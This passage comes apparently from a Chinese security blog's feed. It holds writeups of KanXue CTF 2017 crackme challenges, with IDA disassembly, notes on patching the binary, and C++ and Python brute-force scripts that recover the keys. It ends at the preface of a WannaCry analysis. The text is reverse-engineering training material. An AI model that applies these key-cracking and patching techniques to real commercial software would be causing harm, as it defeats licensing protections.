= p-&gt;i1;</span><br><span class="line">	int i2_1 = p-&gt;i2_1;</span><br><span class="line">	int i2_2 = p-&gt;i2_2;</span><br><span class="line"></span><br><span class="line">	delete[] p;</span><br><span class="line"></span><br><span class="line">	TPP p1 = &#123;0&#125;;</span><br><span class="line">	p1.i1 = i1;</span><br><span class="line">	for(int i=i2_1; i&lt;i2_2; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		p1.i2 = i;</span><br><span class="line">		if(crack1(&amp;p1))</span><br><span class="line">		&#123;</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">void crack2(int i1, int i2_1, int i2_2)</span><br><span class="line">&#123;</span><br><span class="line">	PTPP p = new TPP;//&#123;0&#125;;</span><br><span class="line">	if(p == NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;!!!!!!!!!!!!没neicun！！&quot;);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	memset(p, 0, sizeof(TPP));</span><br><span class="line">	p-&gt;i1 = i1;</span><br><span class="line">	p-&gt;i2_1 = i2_1;</span><br><span class="line">	p-&gt;i2_2 = i2_2;</span><br><span class="line">	</span><br><span class="line">	HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)crack3, (PVOID)p, 0, NULL);</span><br><span class="line">	if(h == NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;CreateTHREAD error [%d]\n&quot;, g_ThreadCnt);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		g_Handles[g_ThreadCnt++] = h;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void crack()</span><br><span class="line">&#123;</span><br><span class="line">	for(int i1=0; i1&lt;SEED_SIZE; i1++)</span><br><span class="line">	&#123;</span><br><span class="line">		int i2 = 0;</span><br><span class="line">#define STEP_SIZE 2</span><br><span class="line">		for(i2 = 0; i2&lt;SEED_SIZE-STEP_SIZE; i2+=STEP_SIZE)</span><br><span class="line">		&#123;</span><br><span class="line">			crack2(i1, i2, i2+STEP_SIZE);</span><br><span class="line">		&#125;</span><br><span class="line">		crack2(i1, i2, SEED_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	int start = GetTickCount();</span><br><span class="line">	g_start = GetTickCount();</span><br><span class="line"></span><br><span class="line">	crack();</span><br><span class="line"></span><br><span class="line">	WaitForMultipleObjects(g_ThreadCnt, g_Handles, TRUE, INFINITE);</span><br><span class="line"></span><br><span class="line">	int spell = GetTickCount() - start;</span><br><span class="line">	printf(&quot;spell time : %d s, thread-count: %d\n&quot;, spell, g_ThreadCnt);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su1986, =&gt; 79;4yx，888aeda4ab</span><br></pre></td></tr></table></figure></p>
<p>由于算法开始有转小写，所以其时答案中所有字母都可以是大小写选择，答案不唯一。</p>
<p>转载请注明出处：<a href="https://anhkgg.github.io/kxctf2017-writeup5">https://anhkgg.github.io/kxctf2017-writeup5</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目入口：&lt;a href=&quot;http://ctf.pediy.com/game-fight-35.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://ctf.pediy.com/game-fight-35.htm&lt;/a&gt;，可下载相关文件&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本题需要在XP系统运行，因为驱动只支持xp&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;00-先看驱动&quot;&gt;&lt;a href=&quot;#00-先看驱动&quot; class=&quot;headerlink&quot; title=&quot;00. 先看驱动&quot;&gt;&lt;/a&gt;00. 先看驱动&lt;/h1&gt;&lt;p&gt;驱动不大，才20多个函数。&lt;/p&gt;
&lt;p&gt;从入口开始分析。&lt;/p&gt;
&lt;h2 id=&quot;1-创建设备&quot;&gt;&lt;a href=&quot;#1-创建设备&quot; class=&quot;headerlink&quot; title=&quot;1. 创建设备&quot;&gt;&lt;/a&gt;1. 创建设备&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.text:000107D5 68 58 13 01 00                                                  push    offset aDeviceVmxdrv ; &amp;quot;\\device\\vmxdrv&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:000107DA 8D 45 F4                                                        lea     eax, [ebp+DestinationString]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:000107DD 33 FF                                                           xor     edi, edi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:000107DF 50                                                              push    eax             ; DestinationString&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:000107E0 89 7D FC                                                        mov     [ebp+DeviceObject], edi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:000107E3 FF D6                                                           call    esi ; RtlInitUnicodeString&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="ctf" scheme="https://anhkgg.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://anhkgg.github.io/tags/ctf/"/>
    
      <category term="writeup" scheme="https://anhkgg.github.io/tags/writeup/"/>
    
      <category term="看雪" scheme="https://anhkgg.github.io/tags/%E7%9C%8B%E9%9B%AA/"/>
    
      <category term="kanxue" scheme="https://anhkgg.github.io/tags/kanxue/"/>
    
      <category term="bbs.pediy.com" scheme="https://anhkgg.github.io/tags/bbs-pediy-com/"/>
    
      <category term="crackme" scheme="https://anhkgg.github.io/tags/crackme/"/>
    
  </entry>
  
  <entry>
    <title>看雪CTF2017第二题lelfeiCM的writeup</title>
    <link href="https://anhkgg.github.io/kxctf2017_writeup2/"/>
    <id>https://anhkgg.github.io/kxctf2017_writeup2/</id>
    <published>2017-06-11T00:36:27.000Z</published>
    <updated>2017-06-14T01:45:43.028Z</updated>
    
    <content type="html"><![CDATA[<p>题目入口：<a href="http://ctf.pediy.com/game-fight-32.htm" target="_blank" rel="noopener">http://ctf.pediy.com/game-fight-32.htm</a>，可下载相关文件</p>
<h1 id="0-定位算法位置"><a href="#0-定位算法位置" class="headerlink" title="0. 定位算法位置"></a>0. 定位算法位置</h1><p>由于是console程序，并且没有隐藏字符串，通过OD/IDA找到关键字符串，所在函数就是关键算法函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:00409058 aWellDone       db &apos;WELL DONE!&apos;,0Ah,0   ; DATA XREF: _main:loc_401257o</span><br><span class="line">.data:00409064 aWrongKey___    db &apos;WRONG KEY...&apos;,0Ah,0 ; DATA XREF: _main+231o</span><br><span class="line">.data:00409072                 align 4</span><br><span class="line">.data:00409074 aKeyFormatError db &apos;key format error...&apos;,0Ah,0 ; DATA XREF: _main+9Ao</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>其实就在main函数中，然后看获取输入之后干了什么。<br>首先检查输入长度是不是在8到20之间，不是提示key len error<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00401066                 cmp     ecx, 8</span><br><span class="line">.text:00401069                 jl      loc_40127A</span><br><span class="line">.text:0040106F                 cmp     ecx, 14h</span><br><span class="line">.text:00401072                 jg      loc_40127A</span><br><span class="line">.text:00401078                 xor     esi, esi</span><br><span class="line">.text:0040107A                 xor     edx, edx</span><br><span class="line">.text:0040107C                 test    ecx, ecx</span><br></pre></td></tr></table></figure></p>
<p>是不是都是数值，不是就提示key format error…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:00401082                 jle     short loc_4010AC</span><br><span class="line">.text:00401084</span><br><span class="line">.text:00401084 loc_401084:                             ; CODE XREF: _main+94j</span><br><span class="line">.text:00401084                 mov     al, [esp+edx+4138h+key]</span><br><span class="line">.text:00401088                 cmp     al, 30h</span><br><span class="line">.text:0040108A                 jle     short loc_401090</span><br><span class="line">.text:0040108C                 cmp     al, 39h</span><br><span class="line">.text:0040108E                 jle     short loc_401091</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 loc_401090:                             ; CODE XREF: _main+8Aj</span><br><span class="line">.text:00401090                 inc     esi</span><br><span class="line">.text:00401091</span><br><span class="line">.text:00401091 loc_401091:                             ; CODE XREF: _main+8Ej</span><br><span class="line">.text:00401091                 inc     edx</span><br><span class="line">.text:00401092                 cmp     edx, ecx</span><br><span class="line">.text:00401094                 jl      short loc_401084</span><br><span class="line">.text:00401096                 test    esi, esi</span><br><span class="line">.text:00401098                 jz      short loc_4010AC</span><br><span class="line">.text:0040109A                 push    offset aKeyFormatError ; &quot;key format error...\n&quot;</span><br><span class="line">.text:0040109F                 call    f_printf_401BE0</span><br></pre></td></tr></table></figure></p>
<p>下面接着就是算法的重要部分了，一看到下面的函数，就知道有点小类结构了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:004012C0 ; KEY_OBJ1 *__thiscall f_keyobj_init_4012C0(KEY_OBJ1 *this)</span><br><span class="line">.text:004012C0 f_keyobj_init_4012C0 proc near          ; CODE XREF: _main+B3 p</span><br><span class="line">.text:004012C0                                         ; f_keyobj_calc_mul_401730+29p ...</span><br><span class="line">.text:004012C0                 push    esi</span><br><span class="line">.text:004012C1                 mov     esi, ecx</span><br><span class="line">.text:004012C3                 mov     dword ptr [esi], offset off_4080C8</span><br><span class="line">.text:004012C9                 call    ds:GetTickCount</span><br><span class="line">.text:004012CF                 mov     ecx, esi</span><br><span class="line">.text:004012D1                 mov     [esi+200Ch], eax</span><br><span class="line">.text:004012D7                 mov     [esi+2008h], eax</span><br><span class="line">.text:004012DD                 call    f_keyobj_init_seed1_401A60</span><br><span class="line">.text:004012E2                 mov     eax, esi</span><br><span class="line">.text:004012E4                 pop     esi</span><br><span class="line">.text:004012E5                 retn</span><br><span class="line">.text:004012E5 f_keyobj_init_4012C0 endp</span><br></pre></td></tr></table></figure></p>
<h1 id="1-算法类结构分析，各类函数的功能分析"><a href="#1-算法类结构分析，各类函数的功能分析" class="headerlink" title="1. 算法类结构分析，各类函数的功能分析"></a>1. 算法类结构分析，各类函数的功能分析</h1><p>先把类结构大致整理出来，方便后续分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000 KEY_OBJ1        struc ; (sizeof=0x2010) ; XREF: _mainr</span><br><span class="line">00000000                                         ; f_keyobj_calc_mul_401730r</span><br><span class="line">00000000 vtable_4080C8   dd ?</span><br><span class="line">00000004 cur_calc_pos    dd ? //结果长度</span><br><span class="line">00000008 seed_array_1024_1 dd 1024 dup(?) //保存key的值</span><br><span class="line">00001008 seed_array_1024 dd 1024 dup(?) //保存序号</span><br><span class="line">00002008 TickCnt_key_seed dd ?</span><br><span class="line">0000200C TickCnt1        dd ?</span><br><span class="line">00002010 KEY_OBJ1        ends</span><br></pre></td></tr></table></figure>
<p>然后就是几个关键函数：</p>
<p>1.1 初始化数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00401A60 ; char *__thiscall f_keyobj_init_seed1_401A60(KEY_OBJ1 *this)</span><br><span class="line">...</span><br><span class="line">.text:00401A8F                 call    f_kyeobj_getindex_4019E0 //更加GetTickCount获取随机index，用于打乱序号的顺序增加分析难度</span><br><span class="line">...</span><br><span class="line">.text:00401ABA                 mov     esi, [ecx]</span><br><span class="line">.text:00401ABC                 sub     ecx, 4</span><br><span class="line">.text:00401ABF                 mov     [eax], esi</span><br><span class="line">.text:00401AC1                 add     eax, 4</span><br><span class="line">.text:00401AC4                 dec     edx</span><br></pre></td></tr></table></figure></p>
<p>这个地方首先就想到了每次GetTickCount不一样，那么算法怎么保证结果相同呢，便想到肯定跟index顺序无关，后面验证果然是，我就把401A60给patch了一下，然初始化的序号结构没有打乱顺序，保持0-0x3ff，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//nop了00401A8F调用的循环部分                 </span><br><span class="line">.text:00401A8F                 call    f_kyeobj_getindex_4019E0 </span><br><span class="line">//这里其实就是seed_array_1024[1023]，不让它倒过来赋值，修改为lea     ecx, [esi+1008h]</span><br><span class="line">.text:00401AAE                 lea     ecx, [esi+2004h]</span><br></pre></td></tr></table></figure></p>
<p>这样之后，就可以很方便查看数据变换，观察这两个字段即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000004 cur_calc_pos    dd ? //结果长度</span><br><span class="line">00000008 seed_array_1024_1 dd 1024 dup(?) //保存key的值</span><br></pre></td></tr></table></figure></p>
<p>后面所有相关函数中有关index转换的也不用关注，因为他变来变去都是0-0x3ff，就只需要关注具体数据操作了。<br>然后其他函数功能分析也就简单了。<br>下面简单列一下，不做详细说明了（很简单，就是数组操作过来过去的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:004014E0 ; int __thiscall f_keyojb_key1_4014E0(void *this, const char *key) //将输入的key保存到seed_array_1024_1 中，字符转为数值，每个值存一个dword</span><br><span class="line">.text:00401970 ; void __thiscall f_keyobj_key1_s2_401970(KEY_OBJ1 *this) //数值大于10，取余存当前index位置，取商和index+1位置求和保存，其实就是进位处理（后面才醒悟）</span><br><span class="line">.text:00401730 ; signed int __userpurge f_keyobj_calc_mul_401730@&lt;eax&gt;(int a1@&lt;eax&gt;, int keyobj0@&lt;ecx&gt;, signed int a3)//用a3取商做右位移，a3取余做加法，其实就是做乘法运算</span><br><span class="line">text:00401840 ; signed int __userpurge f_keyobj_mul2_401840@&lt;eax&gt;(int a1@&lt;eax&gt;, int a2@&lt;ecx&gt;, KEY_OBJ1 *a3)//两个KEY_OBJ做乘法</span><br></pre></td></tr></table></figure></p>
<h1 id="2-醒悟算法究竟是个什么玩意"><a href="#2-醒悟算法究竟是个什么玩意" class="headerlink" title="2. 醒悟算法究竟是个什么玩意"></a>2. 醒悟算法究竟是个什么玩意</h1><p>输入的key关键处理部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004010E0                 push    9</span><br><span class="line">.text:004010E2                 lea     ecx, [esp+413Ch+keyobj]</span><br><span class="line">.text:004010E9                 call    f_keyobj_calc_mul_401730 ;</span><br><span class="line">...</span><br><span class="line">.text:0040110B                 lea     eax, [esp+4138h+keyobj1]</span><br><span class="line">.text:00401112                 lea     ecx, [esp+4138h+keyobj]</span><br><span class="line">.text:00401119                 push    eax</span><br><span class="line">.text:0040111A                 mov     byte ptr [esp+413Ch+var_4], 1</span><br><span class="line">.text:00401122                 call    f_keyobj_mul2_401840</span><br><span class="line">...</span><br><span class="line">.text:00401127                 push    9</span><br><span class="line">.text:00401129                 lea     ecx, [esp+413Ch+keyobj]</span><br><span class="line">.text:00401130                 mov     esi, eax</span><br><span class="line">.text:00401132                 call    f_keyobj_calc_mul_401730 ;</span><br></pre></td></tr></table></figure></p>
<p>先前想着输入的key用9做位移，做加法，干么呢…一直绕不清，后来重新看f_keyobj_key1_s2_401970，觉得是进位处理，一下子就灵光了，这是实现乘法运算（1024位的乘法，真实折腾，nb）。<br>这样算法也基本清楚了。<br>key<em>9</em>key<em>9</em>(…) =&gt; result</p>
<p>怎么校验的呢？</p>
<ol>
<li>计算结果长度必须是奇数</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00401154                 call    f_keyobj_curpos_4013A0</span><br><span class="line">.text:00401159                 and     eax, 80000001h</span><br><span class="line">.text:0040115E                 jns     short loc_401165</span><br><span class="line">.text:00401160                 dec     eax</span><br><span class="line">.text:00401161                 or      eax, 0FFFFFFFEh</span><br><span class="line">.text:00401164                 inc     eax</span><br><span class="line">.text:00401165</span><br><span class="line">.text:00401165 loc_401165:                             ; CODE XREF: _main+15E</span><br><span class="line">.text:00401165                 cmp     eax, 1</span><br></pre></td></tr></table></figure>
<ol>
<li>result[len/2] == key[0]</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401175                 call    f_keyobj_curpos_4013A0</span><br><span class="line">.text:0040117A                 sar     eax, 1</span><br><span class="line">.text:0040117C                 push    eax</span><br><span class="line">.text:0040117D                 lea     ecx, [esp+413Ch+keyobj]</span><br><span class="line">.text:00401184                 call    f_keyobj_check1_4013B0</span><br><span class="line">.text:00401189                 push    0</span><br><span class="line">.text:0040118B                 lea     ecx, [esp+413Ch+keyobj1]</span><br><span class="line">.text:00401192                 mov     edi, eax</span><br><span class="line">.text:00401194                 call    f_keyobj_check1_4013B0</span><br><span class="line">.text:00401199                 cmp     edi, eax</span><br><span class="line">.text:0040119B                 lea     ecx, [esp+4138h+keyobj1]</span><br><span class="line">.text:004011A2                 jnz     short loc_40121C</span><br></pre></td></tr></table></figure>
<ol>
<li>高位部分和key相同（跳过比较那个字节）</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:004011D0                 lea     ecx, [esp+4144h+keyobj1]</span><br><span class="line">.text:004011D7                 push    esi</span><br><span class="line">.text:004011D8                 push    ecx</span><br><span class="line">.text:004011D9                 lea     ecx, [esp+414Ch+keyobj]</span><br><span class="line">.text:004011E0                 call    f_keyobj_check2_4013E0</span><br></pre></td></tr></table></figure>
<ol>
<li>低位部分和key逆序（跳过比较那个字节）</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text:004011F6                 lea     edx, [esp+413Ch+keyobj1]</span><br><span class="line">.text:004011FD                 push    eax</span><br><span class="line">.text:004011FE                 push    1</span><br><span class="line">.text:00401200                 push    0</span><br><span class="line">.text:00401202                 push    edx</span><br><span class="line">.text:00401203                 lea     ecx, [esp+414Ch+keyobj]</span><br><span class="line">.text:0040120A                 call    f_keyobj_check2_4013E0</span><br></pre></td></tr></table></figure>
<p>感觉结果应该是这一个样子的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1234567-&gt;1234567654321 //中间因为长度折腾了好久，后面查了才知道这是回文数，翻半天没有什么算法，脚本已经跑起来了</span><br></pre></td></tr></table></figure>
<p>怎么求逆呢？算法不好，那就脚本跑吧！</p>
<h1 id="3-脚本跑"><a href="#3-脚本跑" class="headerlink" title="3. 脚本跑"></a>3. 脚本跑</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">i = 11111111#</span><br><span class="line">while True:</span><br><span class="line">    break</span><br><span class="line">    is1 = str(i)</span><br><span class="line">    is2_len = len(is1) </span><br><span class="line">    </span><br><span class="line">    is1 = is1[:is2_len-1]</span><br><span class="line">    is2 = is1[::-1]</span><br><span class="line">    </span><br><span class="line">    k = i*9*9*i</span><br><span class="line">        </span><br><span class="line">    ks1 = &apos;&apos;</span><br><span class="line">    ks = &apos;&apos;</span><br><span class="line">    while True:</span><br><span class="line">       </span><br><span class="line">        #print i, k</span><br><span class="line">        #break</span><br><span class="line">        ks1 = str(k)</span><br><span class="line">        </span><br><span class="line">        lll = len(ks1)/2</span><br><span class="line">        </span><br><span class="line">        if len(ks1) &gt; 2*is2_len:</span><br><span class="line">            #print &apos;long out - 1&apos;, i, len(ks1), 2*is2_len</span><br><span class="line">            break</span><br><span class="line">        </span><br><span class="line">        if (is2_len + len(ks1))&gt;1024:</span><br><span class="line">            #print &apos;long out - 1&apos;, i, is2_len + len(ks1)</span><br><span class="line">            break</span><br><span class="line">        </span><br><span class="line">        if (len(ks1)%2!=0) and (is1[0:1] == ks1[lll:lll+1]):</span><br><span class="line">            print  &apos;get -success1 &gt; &apos;, i, is1, k</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        if len(ks1)&gt;1024:</span><br><span class="line">            #print &apos;long out&apos;, i</span><br><span class="line">            break </span><br><span class="line">        </span><br><span class="line">        k = k * i*9</span><br><span class="line"></span><br><span class="line">    ls2_len1 = is2_len-1</span><br><span class="line">    ks = ks1[:ls2_len1]</span><br><span class="line">    </span><br><span class="line">    if ((is1 == ks) and (is2 == ks1[(-1*ls2_len1):])):</span><br><span class="line">        print  &apos;get -success &gt; &apos;, i, is1, k</span><br><span class="line">        print &apos;&apos;</span><br><span class="line">    </span><br><span class="line">    i += 1</span><br><span class="line">    </span><br><span class="line">    if i % 10000000 == 0:</span><br><span class="line">        print &apos;...&apos;, i</span><br><span class="line">    </span><br><span class="line">    if i &gt; 99999999999999999999:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><p>结果最后跑出来是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get -success &gt;  12345679 1234567 12345678987654321</span><br></pre></td></tr></table></figure></p>
<p>因为代码中处理字符存为数值是倒着的，所以key应该是97654321</p>
<p>转载请注明出处：<a href="https://anhkgg.github.io/kxctf2017_writeup2">https://anhkgg.github.io/kxctf2017_writeup2</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目入口：&lt;a href=&quot;http://ctf.pediy.com/game-fight-32.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://ctf.pediy.com/game-fight-32.htm&lt;/a&gt;，可下载相关文件&lt;/p&gt;
&lt;h1 id=&quot;0-定位算法位置&quot;&gt;&lt;a href=&quot;#0-定位算法位置&quot; class=&quot;headerlink&quot; title=&quot;0. 定位算法位置&quot;&gt;&lt;/a&gt;0. 定位算法位置&lt;/h1&gt;&lt;p&gt;由于是console程序，并且没有隐藏字符串，通过OD/IDA找到关键字符串，所在函数就是关键算法函数：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.data:00409058 aWellDone       db &amp;apos;WELL DONE!&amp;apos;,0Ah,0   ; DATA XREF: _main:loc_401257o&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.data:00409064 aWrongKey___    db &amp;apos;WRONG KEY...&amp;apos;,0Ah,0 ; DATA XREF: _main+231o&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.data:00409072                 align 4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.data:00409074 aKeyFormatError db &amp;apos;key format error...&amp;apos;,0Ah,0 ; DATA XREF: _main+9Ao&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="ctf" scheme="https://anhkgg.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://anhkgg.github.io/tags/ctf/"/>
    
      <category term="writeup" scheme="https://anhkgg.github.io/tags/writeup/"/>
    
      <category term="看雪" scheme="https://anhkgg.github.io/tags/%E7%9C%8B%E9%9B%AA/"/>
    
      <category term="kanxue" scheme="https://anhkgg.github.io/tags/kanxue/"/>
    
      <category term="bbs.pediy.com" scheme="https://anhkgg.github.io/tags/bbs-pediy-com/"/>
    
      <category term="crackme" scheme="https://anhkgg.github.io/tags/crackme/"/>
    
  </entry>
  
  <entry>
    <title>WannaCry深度详细分析报告</title>
    <link href="https://anhkgg.github.io/wannacry-analyze-report/"/>
    <id>https://anhkgg.github.io/wannacry-analyze-report/</id>
    <published>2017-05-26T01:29:07.000Z</published>
    <updated>2017-05-26T05:27:07.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h1><p>最近，WannaCry是火了一把，到处都是分析文章，报告，解决方案等等。</p>
<p>趁着这个热度，我也来跟风一把。</p>
<p>前前后后把WannaCry详细分析了一遍。</p>
<p>从文件释放、启动加密器、文件加密策略、加密算法、到解密过程中所有细节进行了详尽深入的分析。</p>
<a id="more"></a>
